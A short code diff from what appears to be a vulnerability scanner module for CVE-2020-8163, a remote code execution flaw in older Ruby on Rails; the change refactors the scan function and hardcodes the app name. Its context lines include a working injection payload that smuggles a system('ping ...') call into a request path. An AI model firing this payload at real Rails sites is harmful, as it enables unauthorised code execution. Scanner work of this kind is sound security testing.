@@ -10,7 +10,7 @@ cve_2020_8163_payloads = [
     {'path': '?[system("ping DNSDOMAIN")end%00]'}
 ]
 
-def cve_2020_8163_scan(self, clients):
+def cve_2020_8163_scan(clients):
     ''' 在 Rails 5.0.1 之前版本中的一个代码注入漏洞, 
         它允许攻击者控制"render"调用"locals"参数执行RCE
     '''
@@ -18,7 +18,7 @@ def cve_2020_8163_scan(self, clients):
     sessid = '2892b92d3c3a1d8b4ab069947ddbc552'
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Ruby on Rails',
         'vul_type': 'RCE',
         'vul_id': 'CVE-2020-8163',
     }
